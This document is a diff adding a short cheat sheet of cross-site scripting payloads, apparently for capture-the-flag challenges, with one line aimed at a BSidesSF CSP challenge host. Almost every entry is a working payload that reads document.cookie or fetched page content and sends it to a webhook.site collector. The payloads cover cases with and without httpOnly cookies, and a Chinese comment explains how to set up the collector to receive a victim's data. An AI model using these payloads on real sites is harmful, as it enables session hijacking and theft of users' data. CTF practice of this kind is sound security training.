@@ -1,0 +1,21 @@
+# httpOnly = false
+<script>fetch('https://webhook.site/a4bf01e8-2831-46c2-b445-4eed14b77220?' + btoa(document.cookie))</script>
+
+# httpOnly = true
+<script>fetch('http://localhost:3000/fuck')
+        .then(response => response.text())
+        .then(data=>fetch('https://webhook.site/a4bf01e8-2831-46c2-b445-4eed14b77220', {method: 'POST', body: data}));
+</script>
+
+
+
+# xss to victim 
+<script src="https://webhook.site/urlB"); </script>
+
+# 在 webhook.site 設定 (右上角 NEW, urlA 為原本的 url, create 後會變成 urlB, 讓 victim 造訪 urlB, 則 urlB 會收到 GET, urlA 會收到 POST, 回到 urlA 即可看到封包 )
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://webhook.site/urlA");
+xhr.send(document.cookie);
+
+
+<img src="#" onerror="fetch('https://csp-1-581db2b1.challenges.bsidessf.net/csp-one-flag').then(t => t.text()).then(d => {fetch('<website_url>/?c='+d)})"/>
